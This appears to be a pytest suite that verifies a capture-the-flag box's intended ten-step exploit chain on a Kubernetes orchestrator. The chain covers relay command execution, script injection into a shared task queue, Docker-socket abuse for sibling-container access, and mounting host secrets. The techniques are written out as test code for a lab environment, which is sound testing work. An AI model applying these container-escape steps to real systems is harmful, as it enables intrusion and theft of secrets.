"""Phase 8 verification: legendary-ferrymans-relay on the Kubernetes
backend. The box's own bring-up logic is unchanged and shared between
both backends (see nested_stacks/legendary_ferrymans_relay.py's
exec_fn-injection refactor) -- this proves the exact same 10-flag
exploit chain test_phase5_legendary.py already proves on Docker, now
over a privileged `docker:dind` *Pod* instead of a plain container.

Unlike that file's `docker exec <outer-container-name> ...`, there is
no local Docker object to reach into here -- every check that isn't a
plain HTTP request goes through `kubectl exec <pod> -c dind -- ...`
instead, reaching the one privileged container inside each instance's
own dedicated Namespace.

Requires: a running orchestrator reachable at ORCHESTRATOR_TEST_URL
(default http://127.0.0.1:9100), configured with
ORCHESTRATOR_K8S_POD_CIDR set, `kubectl` on PATH with a working
context (default: ORCHESTRATOR_K8S_CONTEXT, falling back to
"kind-ctf-test"), and outbound access for the cluster to pull
`docker:27-dind` (a public image -- unlike every other Kubernetes box,
this one's own 3 service images are preloaded directly into the nested
daemon via the orchestrator itself, bypassing kubelet/`kind load
docker-image` entirely for them).

Expect this to be the slowest suite in this project yet -- cold nested
dockerd one layer deeper than the Docker backend when run against
`kind` specifically (host -> kind node -> Pod's dind), plus 3 image
preloads over the Kubernetes exec API. Budget for a "once clean"
allowance on the usual twice-clean bar, same as test_phase4_k8s.py
already does for its own, much lighter suite.
"""
import base64
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import time

import pytest
import requests

from orchestrator.backends.k8s_backend import _k8s_name

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
KUBECTL_CONTEXT = os.environ.get("ORCHESTRATOR_K8S_CONTEXT", "kind-ctf-test")
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

BOX_ID = "legendary-ferrymans-relay"
RELAY_CLIENT = "/opt/web/downloads/relay-client"


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _namespace(team_id: int) -> str:
    # Mirrors k8s_backend.py's own namespace-naming exactly (imported,
    # not reimplemented, so this test can never silently drift from it).
    return _k8s_name("ctf", BOX_ID, str(team_id))


def _pod_name(team_id: int) -> str:
    out = subprocess.run(
        [
            "kubectl", "--context", KUBECTL_CONTEXT, "-n", _namespace(team_id), "get", "pods",
            "-l", "app=web", "-o", "jsonpath={.items[0].metadata.name}",
        ],
        capture_output=True, text=True, check=True,
    )
    return out.stdout.strip()


def _dind_exec(team_id: int, *args: str) -> subprocess.CompletedProcess:
    pod = _pod_name(team_id)
    return subprocess.run(
        ["kubectl", "--context", KUBECTL_CONTEXT, "-n", _namespace(team_id), "exec", pod, "-c", "dind", "--", *args],
        capture_output=True, text=True,
    )


def _relay_client(team_id: int, *args: str) -> str:
    """Runs the box's own bundled relay-client binary from inside the
    nested web container, against relay:9099 -- the real binary, the
    real protocol, exercising the --network-alias relay fix for real
    (unchanged from the Docker backend's own bring-up)."""
    result = _dind_exec(team_id, "docker", "exec", "halcyon-legendary-web", RELAY_CLIENT, "relay", "9099", *args)
    assert result.returncode == 0, f"relay-client {args} failed: {result.stderr}"
    return result.stdout


def _run_via_vault(team_id: int, shell_command: str, timeout_seconds: float = 30.0) -> str:
    _relay_client(team_id, "RUN", "rm -f /shared/task_output.txt")
    b64 = base64.b64encode(shell_command.encode()).decode()
    _relay_client(team_id, "RUN", f"echo {b64} | base64 -d > /shared/task.sh")

    deadline = time.monotonic() + timeout_seconds
    while time.monotonic() < deadline:
        time.sleep(1)
        out = _relay_client(team_id, "RUN", "cat /shared/task_output.txt 2>/dev/null")
        if out.strip():
            return out
    raise AssertionError(f"vault's task queue never produced output for: {shell_command!r}")


@pytest.fixture
def legendary_instance():
    team_id = _TEAM_ID_BASE + 1
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": "kubernetes"},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_flags_1_and_2_via_http(legendary_instance):
    """The real player path for the front door's two flags -- no
    kubectl-exec shortcuts here, this is exactly what an HTTP client
    sees, reached via the real NodePort."""
    inst, secret = legendary_instance
    index = requests.get(f"http://{inst['entry_host']}:{inst['entry_port']}/", timeout=10).text
    assert expected_flag(secret, 1) in index

    login = requests.post(
        f"http://{inst['entry_host']}:{inst['entry_port']}/login",
        data={"username": "relay_ops", "password": "ferryman2024"},
        timeout=10,
    ).text
    assert expected_flag(secret, 2) in login


def test_relay_rce_flags_3_4_5(legendary_instance):
    inst, secret = legendary_instance
    version = _relay_client(inst["team_id"], "VERSION")
    assert expected_flag(secret, 3) in version
    status = _relay_client(inst["team_id"], "STATUS")
    assert expected_flag(secret, 4) in status
    run_out = _relay_client(inst["team_id"], "RUN", "cat /opt/relay/secret/flag5.txt")
    assert expected_flag(secret, 5) in run_out


def test_vault_container_escape_flags_6_and_7(legendary_instance):
    inst, secret = legendary_instance
    out = _run_via_vault(inst["team_id"], "cat /opt/vault/secret/flag6.txt /opt/vault/secret/flag7.txt")
    assert expected_flag(secret, 6) in out
    assert expected_flag(secret, 7) in out


def test_sibling_container_compromise_flag_8(legendary_instance):
    inst, secret = legendary_instance
    out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; docker exec halcyon-legendary-web cat /opt/web/secret/flag8.txt",
    )
    assert expected_flag(secret, 8) in out


def test_fresh_container_reaches_host_secrets_flags_9_and_10(legendary_instance):
    inst, secret = legendary_instance
    flag9_out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; "
        "docker run --rm -v halcyon-legendary-host-secrets:/data alpine cat /data/flag9.txt",
    )
    assert expected_flag(secret, 9) in flag9_out

    passphrase_out = _relay_client(inst["team_id"], "RUN", "cat /opt/relay/secret/relay.conf")
    passphrase = next(
        line.split("=", 1)[1].strip()
        for line in passphrase_out.splitlines()
        if line.startswith("emergency_recovery_passphrase=")
    )

    flag10_out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; "
        "docker run --rm --entrypoint sh -v halcyon-legendary-host-secrets:/data "
        f"ctf-boxes/{BOX_ID}-vault:latest -c "
        f'"cp /data/dossier.enc /tmp/d.enc && '
        f"/opt/venv/bin/python3 /opt/shared/flagcrypto.py decrypt {passphrase} /tmp/d.enc -\"",
    )
    assert expected_flag(secret, 10) in flag10_out


def test_idempotent_create(legendary_instance):
    inst, secret = legendary_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": "kubernetes",
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_destroy_leaves_no_orphaned_namespace(legendary_instance):
    inst, secret = legendary_instance
    namespace = _namespace(inst["team_id"])
    resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
    resp.raise_for_status()

    deadline = time.monotonic() + 60
    while time.monotonic() < deadline:
        check = subprocess.run(
            ["kubectl", "--context", KUBECTL_CONTEXT, "get", "ns", namespace], capture_output=True
        )
        if check.returncode != 0:
            return
        time.sleep(1)
    raise AssertionError(f"namespace {namespace} still exists after destroy")


def test_cross_team_isolation(legendary_instance):
    """Two instances land in two separate Namespaces with NO
    NetworkPolicy applied at all for this nested-docker path (unlike
    every other box on this backend -- see k8s_backend.py's
    _provision_nested_docker_sync, which deliberately never calls
    _apply_network_policies) -- by design, mirroring the Docker
    backend's own choice not to rely on network segmentation here
    either. Real isolation comes from each nested dockerd generating
    its own random TLS CA at startup and requiring mutual auth on its
    Docker API port, exactly like the Docker backend's
    default-bridge-but-TLS-gated design. Confirmed directly, not
    assumed: pod-to-pod TCP reachability across namespaces genuinely
    exists (nothing blocks it), but team A's own client cert is
    rejected by team B's daemon."""
    inst_a, secret_a = legendary_instance
    team_b = _TEAM_ID_BASE + 2
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": "kubernetes"},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        pod_b = _pod_name(team_b)
        ns_b = _namespace(team_b)
        ip_b = subprocess.run(
            ["kubectl", "--context", KUBECTL_CONTEXT, "-n", ns_b, "get", "pod", pod_b, "-o", "jsonpath={.status.podIP}"],
            capture_output=True, text=True, check=True,
        ).stdout.strip()
        assert ip_b, "team B's pod has no IP -- the isolation assumption below doesn't hold"

        reach = _dind_exec(inst_a["team_id"], "docker", "-H", f"tcp://{ip_b}:2376", "ps")
        assert "Client sent an HTTP request to an HTTPS server" in reach.stderr, (
            f"expected a TLS-required rejection proving the TCP connection itself succeeded, got: {reach.stderr}"
        )

        auth_attempt = _dind_exec(
            inst_a["team_id"], "docker",
            "--tlsverify", "--tlscacert=/certs/client/ca.pem",
            "--tlscert=/certs/client/cert.pem", "--tlskey=/certs/client/key.pem",
            "-H", f"tcp://{ip_b}:2376", "ps",
        )
        assert auth_attempt.returncode != 0, "team A's client cert must NOT be accepted by team B's daemon"
        assert "certificate signed by unknown authority" in auth_attempt.stderr, (
            f"expected a cert-authority rejection, got: {auth_attempt.stderr}"
        )
    finally:
        requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}").raise_for_status()
